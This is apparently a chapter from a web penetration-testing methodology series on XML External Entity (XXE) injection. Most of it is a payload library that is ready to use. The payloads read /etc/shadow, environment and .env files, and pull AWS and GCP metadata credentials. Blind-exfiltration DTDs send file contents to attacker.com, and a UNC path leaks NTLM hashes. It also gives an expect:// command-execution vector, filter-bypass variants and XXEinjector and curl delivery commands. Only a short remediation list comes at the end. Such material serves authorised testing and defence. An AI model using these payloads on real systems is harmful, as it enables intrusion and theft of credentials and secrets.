---
title: "XML External Entity Injection (XXE)"
date: 2026-02-24
draft: false
---

# XML External Entity Injection (XXE)

> **Severity**: Critical
> **CWE**: CWE-611
> **OWASP**: A05:2021 – Security Misconfiguration

---

## What Is XXE?

XML External Entity Injection occurs when an **XML parser processes external entity declarations** defined by the attacker within the XML input. If the parser is configured to resolve external entities (often the default in older or misconfigured libraries), an attacker can:

- Read arbitrary files from the server filesystem
- Trigger SSRF to internal services and cloud metadata
- Perform blind data exfiltration via DNS/HTTP
- In some configurations, achieve Remote Code Execution

XXE affects anything that parses XML: REST APIs accepting `Content-Type: application/xml`, SOAP services, file upload endpoints processing DOCX/XLSX/SVG/PDF/ODT, and any XML-based data exchange format.

---

## Attack Surface Map

### Where XXE Lives

```
# Direct XML input:
- SOAP/WSDL endpoints
- REST APIs accepting application/xml or text/xml
- RSS/Atom feed parsers
- Configuration file uploads (XML config)
- SVG file upload (SVG is XML)
- XML-based office formats: DOCX, XLSX, PPTX, ODT, ODS

# Indirect XML input (change Content-Type and resubmit):
- JSON endpoints: try switching Content-Type to application/xml
- Form data: try converting form body to XML

# Hidden XML parsers:
- Image metadata (XMP metadata = XML)
- EXIF processors that also handle XMP
- PDF files (can contain XML metadata)
- HL7, FHIR (healthcare APIs)
- SAML assertions (XML-signed)
- OpenID Connect (sometimes uses XML)
- Microsoft XML-based protocols (Exchange, SharePoint, WebDAV)
- XML-RPC
```

---

## Discovery Checklist

### Phase 1 — Passive Identification

- [ ] Identify all endpoints accepting XML (check `Content-Type: application/xml`, `text/xml`)
- [ ] Identify file upload features — check if DOCX, XLSX, SVG, XML formats are accepted
- [ ] Check SOAP/WSDL URLs (`/service?wsdl`, `/_vti_bin/`, `/ws/`, `/soap/`)
- [ ] Identify any RSS/Atom/sitemap XML parsers
- [ ] Check if JSON endpoints accept XML via Content-Type change
- [ ] Look for XML in mobile app traffic (burp proxy on app)
- [ ] Check SAML SSO authentication flows

### Phase 2 — Active Detection

- [ ] Inject basic XXE with an entity referencing a non-existent file — observe error messages
- [ ] Inject `<!DOCTYPE foo [<!ENTITY xxe "test">]><foo>&xxe;</foo>` — if `test` reflected, entities work
- [ ] Try external entity to OOB server: `<!ENTITY xxe SYSTEM "http://YOUR.oast.fun/">`
- [ ] Try `file:///etc/passwd` reference and check if content returned
- [ ] Test parameter entities (`%xxe;`) for blind XXE if in-band fails
- [ ] Test in SVG upload: embed XXE in SVG XML
- [ ] Test in DOCX: modify `word/document.xml` with XXE payload
- [ ] Check if server responds with error containing file content (error-based XXE)

### Phase 3 — Confirm & Escalate

- [ ] Confirm file read: `/etc/passwd`, `/etc/hosts`, `/proc/self/environ`
- [ ] Identify web root via error messages or known paths → read config files, source code
- [ ] Test SSRF via XXE: `SYSTEM "http://169.254.169.254/latest/meta-data/"`
- [ ] Test blind OOB exfil (DTD on attacker server)
- [ ] Enumerate internal services via SSRF chain
- [ ] Try protocol escalation: `file://`, `php://`, `expect://` (PHP)

---

## Payload Library

### Section 1 — Basic Detection

```xml
<!-- Minimal XXE test — entity definition + reference: -->
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY test "XXE_WORKS"> ]>
<root><data>&test;</data></root>

<!-- If "XXE_WORKS" appears in response → entity processing enabled -->

<!-- Minimal with external system entity: -->
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://YOUR.oast.fun/"> ]>
<root><data>&xxe;</data></root>

<!-- Trigger via SYSTEM to non-existent path (error-based detection): -->
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///this/does/not/exist"> ]>
<root>&xxe;</root>
```

### Section 2 — File Read (In-Band)

```xml
<!-- Linux: -->
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root><data>&xxe;</data></root>

<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/shadow"> ]>
<root><data>&xxe;</data></root>

<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///proc/self/environ"> ]>
<root><data>&xxe;</data></root>

<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///proc/self/cmdline"> ]>
<root><data>&xxe;</data></root>

<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/nginx/nginx.conf"> ]>
<root><data>&xxe;</data></root>

<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///var/www/html/.env"> ]>
<root><data>&xxe;</data></root>

<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///home/app/config.yml"> ]>
<root><data>&xxe;</data></root>

<!-- Windows: -->
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]>
<root><data>&xxe;</data></root>

<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///C:/inetpub/wwwroot/web.config"> ]>
<root><data>&xxe;</data></root>

<!-- UNC path (Windows — triggers NTLM auth to attacker): -->
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "\\ATTACKER_IP\share"> ]>
<root><data>&xxe;</data></root>
```

### Section 3 — SSRF via XXE

```xml
<!-- HTTP SSRF to external (OOB confirmation): -->
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://YOUR.oast.fun/"> ]>
<root><data>&xxe;</data></root>

<!-- AWS metadata: -->
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
<root><data>&xxe;</data></root>

<!-- AWS IAM credentials: -->
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"> ]>
<root><data>&xxe;</data></root>

<!-- GCP metadata: -->
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"> ]>
<root><data>&xxe;</data></root>

<!-- Internal service enumeration: -->
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin"> ]>
<root><data>&xxe;</data></root>

<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://127.0.0.1:9200/_cat/indices"> ]>
<root><data>&xxe;</data></root>
```

### Section 4 — Blind XXE (Out-of-Band Exfiltration)

When file content is not reflected in the response, use parameter entities and an attacker-controlled DTD to exfiltrate data.

#### Step 1 — Host evil.dtd on attacker server

```xml
<!-- evil.dtd (hosted at http://attacker.com/evil.dtd): -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % wrap "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?data=%file;'>">
%wrap;
%send;
```

#### Step 2 — Inject into target

```xml
<!-- Payload sent to target: -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root><data>test</data></root>
```

**Flow**: Target downloads evil.dtd → expands `%file` with `/etc/passwd` content → makes HTTP request to `attacker.com` with data in URL query string → you receive it in server logs.

#### Blind XXE — Alternative Exfil via FTP

```xml
<!-- FTP-based exfil (avoids URL encoding issues with newlines): -->
<!-- evil.dtd: -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % wrap "<!ENTITY &#x25; send SYSTEM 'ftp://attacker.com/%file;'>">
%wrap;
%send;
```

#### Blind XXE — Error-Based File Read

```xml
<!-- Cause a parse error that includes file content in error message: -->
<!-- evil.dtd: -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

The parser tries to open `file:///nonexistent/root:x:0:0:/root:/bin/bash...` — the full /etc/passwd content ends up in the error message returned.

#### Blind XXE — Via Local DTD Repurposing

When external DTD connections are blocked (no outbound HTTP/DNS):

```xml
<!-- Reuse a system DTD that has a repurposable entity: -->
<!-- /usr/share/xml/fontconfig/fonts.dtd contains: <!ENTITY % expr SYSTEM ""> -->

<?xml version="1.0"?>
<!DOCTYPE message [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
  <!ENTITY % expr '<!ENTITY &#x25; error SYSTEM "file:///nonexistent/PLACEHOLDER">
                   <!ENTITY &#x25; read SYSTEM "file:///etc/passwd">
                   '>
  %local_dtd;
]>
<message>test</message>

-- Common local DTD paths to try:
file:///usr/share/xml/fontconfig/fonts.dtd
file:///usr/share/yelp/dtd/docbookx.dtd
file:///usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd
file:///etc/xml/catalog
file:///usr/local/app/schema.dtd
file:///usr/share/gnome/dtd/matecorba-2.0.dtd
```

### Section 5 — XXE via File Upload

#### SVG Upload

```xml
<!-- evil.svg: -->
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>

<!-- SVG with external stylesheet (CSS-based XXE variant): -->
<svg xmlns="http://www.w3.org/2000/svg">
  <style>@import url('http://attacker.com/evil.css');</style>
</svg>

<!-- SVG image reference SSRF: -->
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="http://169.254.169.254/latest/meta-data/" x="0" y="0" height="100" width="100"/>
</svg>
```

#### DOCX/XLSX/PPTX (ZIP-based Office Formats)

Office Open XML files are ZIP archives. Inject XXE into the embedded XML:

```bash
# Extract the DOCX:
unzip document.docx -d docx_extracted/

# Edit word/document.xml — add DOCTYPE before <w:document>:
```

```xml
<!-- word/document.xml — inject at top: -->
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<!-- Insert &xxe; somewhere in the document body -->
```

```bash
# Repack:
cd docx_extracted && zip -r ../evil.docx .
# Upload evil.docx to target
```

**Other XML files inside DOCX to target:**
```
word/document.xml
word/settings.xml
word/numbering.xml
word/_rels/document.xml.rels   ← external relationship references
[Content_Types].xml
```

#### XLSX (Excel)

```bash
# Extract XLSX:
unzip spreadsheet.xlsx -d xlsx_extracted/

# Inject in xl/workbook.xml or xl/worksheets/sheet1.xml:
```

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<!-- reference &xxe; within a cell value -->
```

```bash
# Also check xl/_rels/workbook.xml.rels for external references:
# <Relationship Type="..." Target="http://attacker.com/evil" TargetMode="External"/>
```

#### ODT / ODS (LibreOffice)

```xml
<!-- content.xml within the ODT archive: -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE office:document-content [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<office:document-content ...>
  ...&xxe;...
</office:document-content>
```

### Section 6 — XXE in SOAP / SAML / XML-RPC

#### SOAP

```xml
POST /service/endpoint HTTP/1.1
Content-Type: text/xml; charset=utf-8

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetUser>
      <userId>&xxe;</userId>
    </GetUser>
  </soap:Body>
</soap:Envelope>
```

#### SAML Assertion (during SSO)

```xml
<!-- In the SAMLResponse (base64 decoded): -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <saml:Issuer>&xxe;</saml:Issuer>
  ...
</samlp:Response>
```

#### XML-RPC

```xml
POST /xmlrpc.php HTTP/1.1
Content-Type: text/xml

<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<methodCall>
  <methodName>&xxe;</methodName>
  <params></params>
</methodCall>
```

### Section 7 — PHP-Specific XXE Vectors

```xml
<!-- PHP filter wrapper — base64 encode file content: -->
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<root><data>&xxe;</data></root>

<!-- Expect wrapper (PHP exec — requires expect extension): -->
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "expect://id"> ]>
<root><data>&xxe;</data></root>

<!-- Data URI: -->
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "data://text/plain;base64,SGVsbG8gV29ybGQ="> ]>
<root><data>&xxe;</data></root>
```

### Section 8 — Content-Type Switching

Some JSON endpoints also accept XML — simply change the Content-Type:

```
Original request:
POST /api/user HTTP/1.1
Content-Type: application/json
{"username":"admin"}

Modified to test XXE:
POST /api/user HTTP/1.1
Content-Type: application/xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root><username>&xxe;</username></root>

Other Content-Type values to try:
text/xml
application/xml
application/xhtml+xml
application/rss+xml
application/atom+xml
```

---

### Section 9 — Bypass Techniques

#### Encoding Bypass

```xml
<!-- UTF-16 encoding (some parsers resolve entities differently): -->
<!-- Save file as UTF-16 LE / BE and submit -->

<!-- UTF-7 (rare but works in some older parsers): -->
<?xml version="1.0" encoding="UTF-7"?>
+ADw-+ACE-DOCTYPE foo +AFs- +ADw-+ACE-ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4- +AF0-+AD4-
+ADw-root+AD4-+ACY-xxe+ADs-+ADw-/root+AD4-

<!-- HTML entity obfuscation: -->
<!-- Not standard XML but some parsers handle it -->
```

#### DOCTYPE Restriction Bypass

```xml
<!-- If DOCTYPE is partially blocked, try: -->
<!DOCTYPE foo PUBLIC "-//W3C//DTD XHTML 1.0//EN"
"http://attacker.com/evil.dtd">

<!-- SYSTEM vs PUBLIC keyword: -->
<!ENTITY xxe PUBLIC "any" "file:///etc/passwd">
<!ENTITY xxe SYSTEM "file:///etc/passwd">

<!-- Nested entities: -->
<!DOCTYPE a [<!ENTITY % b "<!ENTITY c SYSTEM 'file:///etc/passwd'>"> %b; ]>
<a>&c;</a>
```

#### Filter Bypass for Keyword Detection

```xml
<!-- Uppercase: -->
<!DOCTYPE FOO [<!ENTITY XXE SYSTEM "file:///etc/passwd">]>

<!-- Whitespace variants: -->
<!DOCTYPE  foo  [  <!ENTITY  xxe  SYSTEM  "file:///etc/passwd">  ]>
<!DOCTYPE
foo
[
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>

<!-- Hex encoding in DTD (for parameter entity bypass): -->
<!ENTITY &#x25; send SYSTEM 'http://attacker.com/'>
```

---

## Tools

```bash
# XXEinjector — automated XXE exploitation:
git clone https://github.com/enjoiz/XXEinjector
ruby XXEinjector.rb --host=attacker.com --httpport=80 --file=request.txt \
    --path=/etc/passwd --oob=http --phpfilter

# xxeftp — FTP server for blind XXE:
git clone https://github.com/staaldraad/xxeserv
./xxeserv -p 2121 -o output.txt

# Burp Suite — built-in XXE detection (audit scan)
# Burp extension: XXE Scanner

# Payload delivery via curl:
curl -s -X POST "https://target.com/api/parse" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><data>&xxe;</data></root>'

# Test DOCX XXE:
# 1. Create docx/ dir with modified word/document.xml
# 2. zip -r evil.docx docx/*
# 3. Upload to target

# Quick OOB server:
interactsh-client -v
python3 -m http.server 80
```

---

## Remediation Reference

- **Disable external entity processing in XML parsers** — the root fix:
  - Java (DocumentBuilderFactory): `factory.setFeature("http://xml.org/sax/features/external-general-entities", false)`
  - Python (lxml): use `resolve_entities=False` in `etree.XMLParser()`
  - PHP (libxml): `libxml_disable_entity_loader(true)` (deprecated in PHP 8 — no longer needed by default)
  - .NET: use `XmlReaderSettings` with `DtdProcessing = DtdProcessing.Prohibit`
- **Disable DTD processing entirely** if DTDs are not required
- **Use JSON** instead of XML where possible — eliminates the attack surface
- **Validate and sanitize** XML input against a strict schema (XSD) that disallows DOCTYPE
- **WAF rules** to detect `<!DOCTYPE` and `<!ENTITY SYSTEM` in requests (as a secondary layer)

---

*Part of the Web Application Penetration Testing Methodology series.*
*Previous: [Chapter 11 — HTTP Header Injection](11_HeaderInjection.md) | Next: [Chapter 13 — XQuery Injection](13_XQuery.md)*
